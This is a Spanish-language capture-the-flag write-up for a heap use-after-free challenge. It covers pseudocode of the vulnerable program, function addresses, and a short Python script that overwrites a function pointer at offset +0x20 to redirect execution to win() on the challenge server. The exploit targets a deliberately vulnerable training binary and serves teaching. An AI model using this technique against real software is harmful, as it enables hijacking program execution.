# Use After Free

| | |
|---|---|
| **Categoría** | Pwn / Heap |
| **Dificultad** | Media |
| **Puntos** | 200 |
| **Reto #** | 16 |
| **Conexión** | `nc chals.tropicalhunters.com 9003` |

## Descripción

Un objeto de heap almacena un puntero a su función de envío en el offset `+0x20`. El programa libera el objeto y vuelve a reservar uno del mismo tamaño. Si el nuevo chunk cae en el bloque liberado, se puede sobrescribir el puntero de función y redirigir la ejecución a `win()`.

## Análisis

```
main():
  obj1 = malloc(0x28)
  obj1[+0x20] = 0x4011d6   ← función de envío normal
  free(obj1)               ← dangling pointer en obj1

  obj2 = malloc(0x28)      ← mismo chunk (tcache/fastbin)
  read(stdin, obj2, 0x28)  ← 40 bytes controlados

  call *[obj1 + 0x20]      ← UAF: obj1 y obj2 comparten chunk
```

| Función | Dirección |
|---------|-----------|
| `print_flag` | `0x4011e7` |
| `win` (llama `print_flag`) | `0x401291` |

## Solución

```python
import socket, struct

payload  = b'A' * 0x20                      # relleno bytes 0–31
payload += struct.pack('<Q', 0x401291)       # win() en offset +0x20

s = socket.socket()
s.connect(("chals.tropicalhunters.com", 9003))
s.recv(1024)
s.sendall(payload)
print(s.recv(1024).decode())
```

La llamada `call *[obj1 + 0x20]` apunta ahora a `win()` → `print_flag()`.

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- **UAF**: el puntero al objeto liberado sigue siendo usado; el nuevo `malloc` del mismo tamaño reutiliza el chunk.
- Tcache/fastbin en glibc devuelve el último chunk liberado del mismo tamaño con alta probabilidad.
- Estrategia: calcular el offset del puntero de función en el objeto, rellenar hasta ese offset, escribir la dirección destino.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
